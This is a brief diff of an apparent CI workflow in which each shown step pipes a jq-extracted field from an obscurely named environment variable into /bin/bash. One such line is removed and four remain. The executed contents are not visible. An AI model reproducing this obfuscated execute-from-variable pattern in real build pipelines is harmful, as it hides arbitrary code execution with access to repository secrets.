@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$a0" | jq -r .v40 | /bin/bash
           printf '%s' "$mqs274" | jq -r .fxchq9 | /bin/bash
           echo $rtvg9128 | jq -r .ogib82050 | /bin/bash
-          echo $zj63751 | jq -r .txqgb3538 | /bin/bash
           printf '%s' "$icv78946" | jq -r .l5989 | /bin/bash
 
       - name: Upload artifact
